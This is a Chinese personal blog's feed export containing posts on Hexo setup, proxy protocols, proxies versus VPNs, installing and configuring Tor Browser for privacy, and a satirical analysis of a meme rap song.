class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pnpm install # 安装依赖</span><br><span class="line">pnpm run setup # 运行安装程序</span><br></pre></td></tr></table></figure><p>等待执行，终端会展示设置项，分别是</p><ul><li>端口号（程序启动时访问端口）</li><li>路径（博客主程序所在路径，例如你将 Hexo 主程序安装在<code>D:\Hexo\blog</code>，你的 Hexon 安装在<code>D:\Hexo\blog\hexon</code>，那么你应该填写的是<code>D:\Hexo\blog</code>）（当然，你也可以不写，直接 Enter）（如果启动后终端有显示什么<code>&#123; username: 'admin', password: undefined &#125;</code>这样的，那就按它提示的来，如果某日发现登录失败，不妨留意下此处）</li><li>用户名（不解释）</li><li>登录密码（不解释。在终端输入时会自动隐藏）</li></ul><p>全部做完后，输入：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm run start  </span><br></pre></td></tr></table></figure><p>然后在浏览器输入<code>localhost:5777</code>（默认端口为 5777），填入你先前设置的信息即可登录。<br>如果你先前配置没问题，而且也验证过了命令行部署且一切正常，以后你就可以放心地在这个界面进行发布、修改、创建页面、部署等基本操作了。</p><h2 id="后记">后记</h2><blockquote><p>Template render error: (unknown path)</p><p>· Error: expected end of comment, got end of file</p></blockquote><p>在某些情况下（常见场景为 LaTeX 中，部分情况下 CSS 文件中）编译时控制台会报出这段错误。（实际上我是在图形化编辑器中看到这个报错，编译推送过程没有问题，但既如此，不妨解决，不留后患）</p><p>Hexo 使用了 nunjucks 渲染器，<code>\&#123;\#</code>很容易被识别为注释标记（写完这段文字后我的编辑器也报错了，所以使用了<code>\</code>将其隔开），在实际错误复现时<code>&#123;</code>和<code>#</code>直接连起来且单独存在，即只写了半个，则控制台有很大概率会飘红。这里有以下两个解决方案：</p><ol><li>使用<code>\{\#</code>包裹且不要用反引号包裹这段字符，否则还是有可能被误解析（这里为演示方便故包裹字符，且使用反斜杠转义，在实际情况下这个反斜杠是没有的，且<code>raw</code>标记符号外不要用反引号包裹，即尽量不使用 Markdown 代码语法）</li><li>CSS 选择器（尤其是压缩后的）相关则需手动换行，总之不能让这两个字符在没有其他转义的情况下连续存在；</li><li>如果使用 LaTeX 无法避免，则可使用<code>&#123;'&#123;&#123;'\&#123;\#'&#125;&#125;'&#125;</code>使其成为字符串</li></ol><blockquote><p>extends includes/layout.pug block content include ./includes/mixins/indexPostUI.pug +indexPostUI</p></blockquote><p>程序缺少相应的渲染器。只需在【blogroot】目录下打开终端执行安装代码即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-render-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><blockquote><p>failed to push some refs to</p></blockquote><p>此时因为某种原因，远程库与本地库不一致。换言之，远程库发生了更新，但本地库没有同步更新。</p><p>你可以在<code>.deploy_git</code>目录下（该目录可能是隐藏的，可以在文件资源管理器顶部<code>查看</code>-&gt;勾选<code>隐藏的项目</code>）打开 Git 终端，使用以下命令同步文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git pull --rebase origin master</span><br></pre></td></tr></table></figure><p>随后正常执行<code>git push</code>的命令即可。</p><p>其实还有一个简单粗暴的办法：既然是远程库与本地库不一致，那就把远程的拉取下来替换本地的库，反正执行 hexo 三件套时这里也要更新的。在<code>.deploy_git</code>中删除所有文件后，将最后一次推送通过<code>git clone</code>命令拉取下来，然后回到【blogroot】目录下正常执行 hexo 三件套便可完成推送。</p>]]></content>
      
      
      <categories>
          
          <category> 经验记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GitHub </tag>
            
            <tag> Hexo </tag>
            
            <tag> 代码 </tag>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简析不同的代理协议</title>
      <link href="/posts/1544165171/"/>
      <url>/posts/1544165171/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="SS（Shadowsocks）">SS（Shadowsocks）</h2><p>Shadowsocks 分为服务器端和客户端，在使用之前，需要先将服务器端程序部署到服务器上面，然后通过客户端连接并创建本地代理。</p><p>Shadowsocks 是由 clowwindy 开发的开源项目，是一个简单的 SOCKS5 代理工具。开发的初衷是为了能让自己简单高效地科学用网，自己使用了很长一段时间后觉得不错才共享出来的。但很可惜，不久之后 clowwindy 被请去喝茶了，项目暂停（好像 github 仓库还被条子蜀黍撅了来着）</p><h2 id="SSR">SSR</h2><p>服务端一般是由 Python 写的，启动也比较简单，前人已经帮大家写好很多东西了，按照安装步骤来。只需要简单的配置和命令就能启动客户端了。检查防火墙端口开放，检查服务器厂商端口开放，一般就能用客户端输入些参数直连了。就是正向代理而已。</p><p>客户端一般是通过白名单的模式，对你访问的非白名单的网站进行代理。比如 bilibili 这种网站，就不会走代理，当然如果你开启了全局代理，所有的请求都会走代理服务器再去你访问的网站，绕一大圈，国内网站速度会下降，所以这个慎重开。</p><h2 id="Trojan">Trojan</h2><p>它是近些年兴起的网络工具，项目官网 <code>https://github.com/trojan-gfw</code>。与强调加密和混淆的 SS/SSR 等工具不同，trojan 将通信流量伪装成互联网上最常见的 https 流量，从而有效防止流量被检测和干扰。在敏感时期，基本上只有 trojan 和 v2ray 伪装能提供稳如狗的体验。</p><p>它需要依靠 Nginx 伪装成正常网站，需要申请个域名，自行搭建比较麻烦。一般是有一键安装的脚本，可以直接装 Nginx 和 Trojan，这个会伪装成一个“旅游”网站什么的，你的香港的服务器或者其他能访问的服务器会变成一个网站。</p><p>由于 Trojan 停更已久，对安全要求较高的建议研究 V2Ray。而且文档、社区热度、配置教程、支持度等方面综合来看，你也应该选择更有名气的 V2Ray。</p><h2 id="补充：">补充：</h2><p>这篇文章对几种协议有不错的概括（<code>https://woniu.ws/a/blog/2021/0723/11.html</code>）：</p><p><em>- 假如在一条车流量很大的大路上</em></p><ul><li><em>用 HTTP 的都是窗户透明型号统一的出租车</em></li><li><em>用 HTTPS 的都是窗户不透明型号统一的出租</em></li><li><em>用 SS/SSR/V2Ray 原协议的都是一些窗户不透明的私家</em></li><li><em>SS/SSR 用 HTTP/TLS 混淆的都是把私家车染成了出租车的样</em></li><li><em>用 VP-N 的都是坐的大巴，虽然关着窗但知道这肯定是大巴</em></li><li><em>总结来说 V2-ray WS + TLS 是最安全隐秘的。</em></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代理和 V-P-N 的区别</title>
      <link href="/posts/3554105694/"/>
      <url>/posts/3554105694/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong><em>这二者都不是为“科学用网”而生，只是它们恰好可以达到这个目的而已。</em></strong></p><p><strong><em><font color="red">本文仅供技术学习使用，请勿利用本文内容进行任何违法、淫秽、暴力等行为，否则后果自负</font></em></strong></p><p><strong><em>另外，如果将其用于“科学用网”目的，请务必保持谨慎的态度和理智，拥有自己的判断，且不要到处伸张。</em></strong></p><h2 id="什么是代理？">什么是代理？</h2><p>代理（Proxy）经常被叫做“梯子”或者“桥”——正如其工作原理：由代理服务器自己去访问你的目标网站，并加载它的内容，然后再把这些加载过的内容传递到你的窗口上，这样就相当于你在浏览目标网站了。你的终端会先将流量发送给代理服务器，然后由代理服务器处理后传给你，如同“桥”一样，连接难以跨过的障碍。你若能连上代理服务器，那么你能访问的内容就是你所在国家或地区可访问的内容，以及你所连的代理服务器所在国家或地区可访问的内容。</p><h2 id="什么是-VPN？">什么是 VPN？</h2><p>虚拟专用网络（Virtual Private Network），简称 VPN。它可以在公用网络上建立专用网络，进行加密通讯，在企业网络中有广泛应用。VPN 网关通过对数据包的加密和数据包目标地址的转换实现远程访问。VPN 可通过服务器、硬件、软件等多种方式实现。</p><p>VPN 为您的数据创建一个加密隧道，通过隐藏您的 IP 地址来保护您的在线身份。在 VPN 服务下，你传输的信息会先经过 VPN 服务器，然后再抵达目的地，反过来的接收过程也是一样。它在操作系统级别工作，会重定向你的所有流量，无论是来自浏览器还是应用程序，甚至互联网和设备之间的流量。因此，您的互联网服务提供商 (ISP) 无法看到您在线做了什么，只知道您连接了一个 VPN 服务器。</p><h2 id="它们有什么区别？">它们有什么区别？</h2><h3 id="代理和优缺点">代理和优缺点</h3><p>由上面的分析可见，二者主要区别在于终端与服务器之间的数据传输。得益于代理的工作原理，你甚至不需要安装任何软件就能使用——这使得代理的上手难度较低，非常适合作为临时解决方案。你所看到的安装型代理工具，在技术上并不是必须的。因此如果你仅仅是要破除网站屏蔽，那么代理服务器可能是最简单便捷的方案了。举个可能不太恰当的例子，Cloudflare Workers 镜像网站便是其一。<br>当然，如果你希望匿名访问，它可能不是好的选择。从终端到代理服务器之间的过程，好比在马路上开车，人们可以看到你的车是什么型号、车牌号是多少。黑客也可以轻而易举地获取你发送出去的信息，这可不安全。长期使用代理服务器，你会发现它会变慢而且速度并不稳定。</p><h3 id="VPN-的优缺点">VPN 的优缺点</h3><p>VPN 和代理服务器是很接近的，你传输的信息会先经过 VPN 服务器，然后再抵达目的地，反过来也是一样——主要区别就在于你向服务器发送数据的这个环节。由于其从终端开始加密信息，故使用 VPN 必须安装相应的软件。好处就是，包括网络服务商在内的任何人都无法看到你传输的东西，截获到的也只是加密数据，去解密它花费的成本可能不及截获几个代理数据（GFW 太强大的那种咱不讨论哈）。</p><p>贵！当然，VPN 的价格通常是不低的，免费的没保障。而且数据在你的终端上预处理后再发送，相比于在远程服务器上处理数据的代理，速度会有一定的下降。</p><h2 id="我该如何选择二者？">我该如何选择二者？</h2><p>如果你对隐私要求不高，只是想访问被你所在国家或地区封锁的内容，代理更为合适；如果你想加密你发送的数据，那么 VPN 更合适。如果你想加密的数据于你而言非常重要，那么大概率的，使用 VPN 是比较划算的。</p>]]></content>
      
      
      <categories>
          
          <category> 信息技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tor 浏览器的安装与注意事项</title>
      <link href="/posts/3085606162/"/>
      <url>/posts/3085606162/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><font color="red">本文仅供技术学习使用，请勿利用本文内容进行任何违法、犯罪、暴力等行为，否则后果自负</font></p><p>另外，如果将其用于“科学用网”目的，请务必保持谨慎的态度和自己的观点，且不要到处伸张。由于外面的网络没有国内的审查，在你获得更丰富的知识的同时，也存在着撞见“不和谐”内容的风险——而且比你在国内网络遇到的场面还要离谱。</p><h2 id="Tor-是什么">Tor 是什么</h2><p>Tor（洋葱路由）网络是一个用来保护你的互联网以及隐私的匿名网络。正如其含义“洋葱”一样，它的协议和网桥将用户真实网络信息层层包裹并发送出去。Tor 是一个基于 FireFox 的“魔改版”，得益于其操作的简便性与效率，让它成为了当下最流行的暗网访问工具，让 I2P 之类的软件成为了“备用”一般的存在。当然，正因为流行，Tor 得到的“关注”也不小，例如它的加密信息有次被截获，然后几个暗网组织被端掉。</p><p>Tor 网络是一组志愿者运营的服务器。Tor 通过在由志愿者运营的分布式中继系统之间跳转来保护互联网通信。这避免了人们窥探我们的网络，他们无法了解我们访问的网站或者用户身在何处，并且也可以让我们访问被屏蔽的网站。</p><p>请记住，这玩意和代理、VPN 一样，它们都不是为了“科学用网”而生，只是它们恰好可以达到“科学用网”的目的</p><h2 id="我为什么需要-Tor">我为什么需要 Tor</h2><p>设计 Tor 的主要目的是为了上网隐匿身份。所以，跟其它的“科学用网”工具不同。它的重点功能是【隐匿性】，“科学用网”只是它顺带的功能。因此，使用它的人大多有以下几类：</p><ul><li>为了隐匿自己所在的国家。有些视频网站为了版权的原因，会限制某些国家的 IP，那么你可以利用 Tor 来伪装成别国的网民，就可以绕过视频网站的版权限制。但你只想改 IP 为何不尝试更加快速的代理呢？</li><li>为了隐匿自己的公网 IP。很多人在互联网上非常“谨慎”，不希望泄露太多信息，那 Tor 便是不错的选择。</li><li>为了保护隐私。刚才已经说了 Tor 的特点，在隐私保护方面，Tor 优于其它的“科学用网”工具。</li></ul><p>但因为某些原因，使用 Tor 的前提是你最好已经能够打开 Google 并用它流畅地搜索东西并加载——不流畅也行，但不要太慢。</p><p>【但讲真，你上网查个资料打个游戏用得着费这么大劲干什么……也对，至少去年年底电子书爱好者的“快乐老家”Zlibrary 被抄了，也就 Tor 网址算是比较让人放心的地址之一】</p><p>【至于你说要用它去干些什么哈人的事，我在此不做评价……就，祝你安好，喝不喝茶我不好说。你要干正常事吧，那被晶哥请喝茶的概率会小很多。】</p><h2 id="Tor-有哪些缺点">Tor 有哪些缺点</h2><p>有些网站/软件对 Tor 不友好。这是 Tor 原理所致，难以从根本上解决：</p><ul><li>屏蔽了 Tor 的出口节点。有些网站对这种匿名网络会进行屏蔽，一旦该网站的服务器判断出访问者 IP 是“Tor 出口节点”，就不处理来自这个 IP 的网络协议。</li><li>GFW 屏蔽了 Tor 的出口节点。GFW 的系统可以做到“双向过滤”，既可以屏蔽从内向外访问，也可以屏蔽反过来的情况。Tor 不可能不被其注意，因此其出口节点列入其“IP 黑名单”。但是 Tor 全球网络的“出口节点”会动态变化，GFW 的“IP 黑名单”可能会有漏网；更有些国内网站可能启用了 CDN 或有国外镜像站，那么 Tor 依然可以正常访问这些国内网站（的镜像或缓存）。</li><li>Tor 出口节点对网站的访问流量过大，被网站动态拉黑。很多大型网站的服务器都有一些“安全防护措施”。比如说，网站服务器会统计每个公网 IP 的访问量。一旦发现某个公网 IP（对网站）的访问量太大，就认定是某种恶意行为。这点不说 Tor，你挂个使用者很多的代理节点去访问 google，刚进去给你跳出来那个人机验证就是了。</li><li>以上问题的根本的原因在于——Tor 的全球网络虽然有成百上千的节点，但大部分节点都不是“出口节点”。或者说，“出口节点”只占 Tor 全球网络节点数的一个较小的比例。而 Tor 的全球用户数是逐年增长，“用户数的增长”明显快于“出口节点数的增长”。“僧多粥少”，几乎每个出口节点都是无数的用户在使用，你自己想想看……</li></ul><h2 id="我应该如何安装-Tor">我应该如何安装 Tor</h2><p>由于 Windows 系统和 MacOS 系统的安装方式是“傻瓜式”，在此不多作说明，请自行前往 <a href="https://www.torproject.org/download/" rel="external nofollow noreferrer">https://www.torproject.org/download/</a> 下载。下不下来就挂个普通的加速器去 github 找 Torproject 官方仓库去，而且 Gitee、阿里、清华等镜像源好像也有 Tor。总之，你是有办法在国内找到的。</p><p>既然你使用 Tor 是为了安全，有虚拟机的大抵会选择把 Tor 装在虚拟机上。此处我们以 Linux 为例。</p><p>插个嘴：kali 官方有预先配置好虚拟机的系统文件。</p><h3 id="CentOS、RHEL、Fedora">CentOS、RHEL、Fedora</h3><p>Tor 包是 EPEL 仓库的一部分，如果你安装了 EPEL 仓库，我们可以直接使用 yum 来安装。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo yum install tor</span><br></pre></td></tr></table></figure><p>如果你的系统没有 EPEL 仓库，请使用下列命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RHEL/CentOS 7：</span><br><span class="line">$ sudo rpm -Uvh https://dl.fedoraproject.org/pub/epel/7/x86_64/e/epel-release-7-11.noarch.rpm</span><br><span class="line">RHEL/CentOS 6 (64 位）：</span><br><span class="line">$ sudo rpm -Uvh http://download.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm</span><br><span class="line">RHEL/CentOS 6 (32 位）：</span><br><span class="line">$ sudo rpm -Uvh http://dl.fedoraproject.org/pub/epel/6/i386/epel-release-6-8.noarch.rpm</span><br></pre></td></tr></table></figure><h3 id="Ubuntu">Ubuntu</h3><p>对于 Ubuntu 而言，需要添加官方 Tor 仓库。我们需要将仓库信息添加到 /etc/apt/sources.list 中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo nano /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>添加以下信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Ubuntu 16.04：</span><br><span class="line">deb http://deb.torproject.org/torproject.org xenial main</span><br><span class="line">deb-src http://deb.torproject.org/torproject.org xenial main</span><br><span class="line"></span><br><span class="line">Ubuntu 14.04</span><br><span class="line">deb http://deb.torproject.org/torproject.org trusty main</span><br><span class="line">deb-src http://deb.torproject.org/torproject.org trusty main</span><br></pre></td></tr></table></figure><p>打开终端，配置秘钥：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ gpg -keyserver keys.gnupg.net -recv A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89</span><br><span class="line">$ gpg -export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | sudo apt-key add -</span><br></pre></td></tr></table></figure><p>更新软件源：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update</span><br></pre></td></tr></table></figure><p>安装 Tor：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install tor deb.torproject.org-keyring</span><br></pre></td></tr></table></figure><p>当然你也可以选择这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update </span><br><span class="line">sudo apt install torbrowser-launcher</span><br><span class="line">sudo add-apt-repository ppa:micahflee/ppa</span><br></pre></td></tr></table></figure><p>如果不想继续使用 Tor，卸载命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt remove torbrowser-launcher</span><br></pre></td></tr></table></figure><h3 id="Debian">Debian</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt install tor</span><br></pre></td></tr></table></figure><h3 id="Kali">Kali</h3><p>在终端输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install -y tor torbrowser-launcher</span><br></pre></td></tr></table></figure><p>然后以“用户”身份输入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">torbrowser-launcher</span><br></pre></td></tr></table></figure><p>当然你也可以选择去找 Tor 的图标点击启动。</p><p>注：可能是因为我的网络没配置好，导致 Tor 配置不来。Linux 上 Tor 的配置可能真的需要预先配置好梯子。所以不想折腾的，且对安全性要求没那么高的，还是去用 Win 系统。</p><h2 id="我应该如何使用-Tor">我应该如何使用 Tor</h2><p>既然你已经解决了安装问题并正常启动，那么下一件事便是去给 Tor 官方发邮件要网桥。<br>你要嫌麻烦或对安全性要求不高可以去这里：<a href="https://t-browser.sourceforge.net/bridges.html" rel="external nofollow noreferrer">https://t-browser.sourceforge.net/bridges.html</a><br>再不行用 Tor 内置网桥，就这样。</p><p>由于众所周知的原因，Tor 在国内是不可以直接连接国际网络的，因此需要设置前置代理，并且只支持 socks 代理。完成相关工具的配置后（记得关闭代理软件客户端以及服务端的 “流量探测（sniffing）功能”）进入 Tor 浏览器内，找到浏览器的代理设置（假设你的工具 socks 代理端口为 1080）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">代理服务器类型：socks5</span><br><span class="line">地址：127.0.0.1</span><br><span class="line">端口：1080（填写本机 socks 端口）</span><br></pre></td></tr></table></figure><p>之后在 tor 的安装文件夹里找到 torrc 文件</p><ul><li>Linux、Windows：Tor 浏览器文件夹/Browser/TorBrowser/Data/Tor</li><li>macOS：~/Library/Application Support/TorBrowser-Data/Tor</li></ul><p>打开该文件并在其末尾添加以下内容，可排除一些危险节点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ExcludeNodes  &#123;cn&#125;，&#123;&#125;，&#123;&#125;</span><br><span class="line">StrictNodes  1</span><br><span class="line">EntryNodes &#123;&#125;,&#123;&#125;</span><br><span class="line">ExitNodes &#123;us&#125;,&#123;&#125;</span><br><span class="line">NewCircuitPeriod 3600</span><br></pre></td></tr></table></figure><p>为了安全起见，不要排除太多国家的节点；如果没有特殊需求，不建议自行修改配置文件，也不要特别设置入口和出口节点。</p><h2 id="我需要注意什么">我需要注意什么</h2><p>始终使用 Tor 浏览器：避免使用普通浏览器访问 Tor 网站（<code>.onion</code>域），因为普通浏览器无法提供相同的隐私保护（况且普通浏览器也没法直接访问它们）。</p><p>保持 Tor 浏览器更新：定期检查并更新 Tor 浏览器，以确保你拥有最新的安全补丁和功能。</p><p>避免登录账户：尽量不要在 Tor 浏览器中登录个人账户（例如社交媒体、电子邮件等），以减少暴露身份的风险。</p><p>禁用插件和扩展：避免使用任何插件或扩展，因为它们可能会泄露你的真实IP地址或其他信息。</p><p>不下载文件：避免在 Tor 浏览器中下载文件，尤其是 PDF、文档等。</p><p>保持小心的浏览行为：尽量不要在 Tor 上提供个人信息或进行在线支付，而是使用伪名和临时的电子邮件账户；不懂匿名网络交易规则就别在上面交易，因为 Tor 只能保护您的隐私，而不能保护您的权益。</p><p>注意搜索引擎：如果您想在使用 TOR 时保持匿名，请勿使用 Google 等容易主动收集您请求信息的搜索引擎，而是使用 DuckDuckGo、StartPage 等搜索引擎。</p><p>使用 HTTPS：尽量通过 HTTPS 网站访问内容，可以提供额外的加密保护；HTTP 的数据在出口节点也可能被获取并访问，因为 TOR 仅加密其网络内的连接。</p><p>避免使用不安全的网络：尽量在可信的网络环境下使用 Tor，避免在公共 Wi-Fi 网络上使用 Tor；不要同时使用 Tor 和普通网络访问同一个站点、服务器，对方可以很轻松地以此为线索获取您的真实访问身份。</p><p>了解流量分析的风险：即使你使用 Tor，仍然可能遭遇流量分析攻击。保持警惕，不要与已知的身份或行为模式关联。</p><p>使用 V-P-N（可选）：如果你希望额外的隐私保护层，可以考虑在使用 Tor 之前先连接到 VPN，但请注意，某些 VPN 服务可能会记录你的活动。</p><p>参考：</p><ul><li><a href="https://linux.cn/article-9245-1.html" rel="external nofollow noreferrer">https://linux.cn/article-9245-1.html</a></li><li><a href="https://digitalixy.com/howto/687196.html" rel="external nofollow noreferrer">https://digitalixy.com/howto/687196.html</a></li><li><a href="https://www.kali.org/docs/tools/tor/" rel="external nofollow noreferrer">https://www.kali.org/docs/tools/tor/</a></li><li><a href="https://blog.csdn.net/SYJAaso/article/details/141310882" rel="external nofollow noreferrer">https://blog.csdn.net/SYJAaso/article/details/141310882</a></li><li><a href="https://cloud.tencent.com/developer/news/422927" rel="external nofollow noreferrer">https://cloud.tencent.com/developer/news/422927</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>名不副实的真与狂 - 简单赏析《I Got Smoke》</title>
      <link href="/posts/763639381/"/>
      <url>/posts/763639381/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>【警告：本文纯属扯淡整活瞎赏析，切勿当真！！！】</p><blockquote><p><em>I GOT 油 我想抽</em></p><p><em>I GOT 油 ALL MY MIND</em></p><p><em>抽不了兜着走</em></p><p><em>走走走走走走走</em></p><p><em>如果说《zood》是春江花月夜，孤篇压全唐，那《I got smoke》就是滕王阁序，无限的炫技。而经过少年时的鲜衣怒马，和蓦然回首时的醒悟，就如同杜甫的登高，会当凌绝顶的气魄和无边落木萧萧下的落寞，《烟 distance》用舒缓的叙事方式解构了丁真本身，就像赤壁赋，文采斐然的同时还充满了人文哲理</em></p></blockquote><p>前日子听到《I Got Smoke》（以下简称 IGS），越听越上头。其 MV 震撼的开头，充满节奏感的鼓点，口齿不清的说唱，构成了一种抽象的美；再次细品，其始于烟却不止于烟，始于丁真却不止于此。在略了解了下背景后，忽感到，这下更不得不听了。</p><p>先讲述其创作背景。</p><p>V 在燃烧（以下简称 V）在他的一次直播中有提到：</p><blockquote><p>做出 igs 的原因是那个……资本运作没有没有原因没有原因。就是那天晚上那天晚上我什么……我不想探讨我的动机了，我就想探讨一下……那天晚上，我喝醉了，然后我在看一个管人痴，然后那娘们毕业了我草我就觉得真伤感。然后这个时候我的日推给我推了一首 I Got Love。然后我说，哎呦行吧，要不做完这首歌，把 B 站账号注销了算了。然后我 OK，</p><p>【歌词】</p><p>我想都没想然后把这些词一股脑地往那个记事本上面扔，</p><p>【歌词】</p><p>这种这种乱七八糟的词一股脑往上面扔，我就想取悦我自己……</p></blockquote><p>这不胜似当年王羲之醉酒写下兰亭序吗？文章本天成，妙手偶得之。多种巧合的碰撞之下，这首歌诞生了。</p><p>美国说唱为什么到中国变得不受欢迎？因为美国说唱是老黑们在枪支弹药炸鸡和毒品谋杀犯罪的土壤里成长起来的，到了我们这里，水土不服。而这首歌就是我们的土壤里成长出来的，中文说唱由此成长起来了。</p><p>如果说美国说唱背后的土壤是横飞的子弹和抽大了的罪犯。那我们说唱背后的土壤就是阶级割裂，还有审核举报一个作品，下架和补档是检验狠活的唯一标准。</p><p>《毛诗·大序》记载：“诗者，志之所之也。在心为志，发言为诗”。南宋严羽《沧浪诗话》云：“诗者，吟咏性情也”。雪莱在《诗辩》中将诗歌称为“想象的表现，是生活的映象，是时代的精神、民族觉醒的先驱和战斗的号角”。</p><p>文章合为时而著，诗歌合为事而作。IGS 绝不是无病呻吟，也不是为赋新词强说愁。否则，它终究只是一首不错的鬼畜作品，不会火这么久，历经十余次补档，依然挺立。</p><p>它诞生于这个时代，是人们抒情言志的载体，寄托着对丁真不满和抗议；而听懂了这首歌，便会发觉，其字字似批评丁真抽烟，却字字讽刺其背后的推手。</p><p>——————————</p><p>子曰，《诗》三百，一言以蔽之，思无邪。IGS 和诗经一样，纯真，但不“无邪”。</p><p>歌词以第一人称视角，塑造了一个纯真藏族儿童形象。在古典诗歌中有一门类“闺怨诗”，诗人就用闺中怨妇的视角抒写妇女忧伤或少女怀春、思念情人的感情，实则抒发的是自身境遇的不满和惆怅。<br>而 IGS 的精神内核比起闺怨诗更加昂扬和浓烈。</p><p>很多人说歌的开头只是普通的鼓点与伴奏，而 MV 的开头，直接给这首歌提升了无数档次。MV 的开头，丁真骑在白马上，周围人头攒动，簇拥其前行。身后的五星红旗与党旗，还有“振兴”、“社会主义核心价值观”之横幅，带给人一种强烈的视觉冲击。鼓点恰到好处，丁真骑马行于街道的片段，互相映衬。长达 37 秒的开头，尽显一个“狂”字。这是一种蔑视一切的叛逆，是年少轻狂，是“春风得意马蹄疾，一日看尽长安花”。</p><p>有人表示，这个视频被下架多次，这个开头“功不可没”。画面中的五星红旗，画面外无数黑暗中的小镇做题家；鸽子笼里做题家颓丧和愤世嫉俗的疲劳，马背上“丁真”的肆意和随心所欲的悠然。丁真之狂，做题家之悲。</p><blockquote><p><em>满身烟味的我走路带上点浮夸</em></p><p><em>想买悦刻五代找我丁真就对了</em></p><p><em>竖起中指王源他算个寄吧</em></p><p><em>台上打饱嗝我在和雪豹比划</em></p></blockquote><p>这四句中，“烟”、“悦刻五代”贯穿全曲，结合有丁真和王源的抽烟事件，以及丁真在舞台上介绍雪豹时不标准的发音，以第一人称视角，以“自述”的方式调侃关于丁真的黑料。</p><blockquote><p><em>丁真势力正在不断地扩大</em></p><p><em>微博之夜掏裤裆我上上下下</em></p><p><em>珈乐心理放线被我轻松击垮</em></p><p><em>甜美微笑爆杀那些小镇做题家</em></p></blockquote><p>丁真因为网上一段买泡面时看向镜头的微笑而火爆全网，加上官方和资本的助推“造星”，让丁真的知名度进一步上升，登上“微博之夜”舞台只是后来的其中一件事。“珈乐”一句，从 V 在直播中所述可知，珈乐是他喜欢的 Vtuber。那天晚上，珈乐官宣“毕业”，V 心中难受，加上喝醉，又因丁真的火爆与背后的手脚，有感而发，作 IGS。下一句无需解释，一个九年义务教育都没完成的孩子，一个普通话都说不完整的孩子（截至 IGS 创作完成并发布），一段视频，一个微笑，火爆全网；那些“小镇做题家”们，寒窗苦读，没几个出人头地。谁看了不难受？B 站上 IGS 